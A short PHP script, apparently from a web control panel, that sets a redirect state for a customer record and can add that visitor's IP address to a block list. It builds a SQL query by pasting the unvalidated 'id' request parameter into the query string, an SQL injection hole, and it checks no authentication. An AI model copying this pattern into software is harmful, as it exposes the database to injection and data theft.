<?php
require_once("../common/commonfiles.php");
$id = !empty($_GET['id']) ? $_GET['id'] : "";
$redirect = !empty($_GET['redirect']) ? $_GET['redirect'] : "";


if (!empty($id)) {
    $obj['redirect1'] = $redirect;
    $obj['status'] = $_GET["redirect"] == "url" ? 1:2;
	$obj['blink'] = 0;
    $query = db::prepUpdateQuery($obj, "customer_details", "id", $id); //(Associative array, table name, record id)
    $result = db::updateRecord($query);
    if($redirect == "block"){
        $ip = db::getCell("SELECT ip FROM data WHERE id='".$id."'");
        db::insertRecord("INSERT INTO ips (`id`,`ip`,`is_block`) VALUES (NULL,'" . $ip . "','1');");
    }
    return $result;
}
?>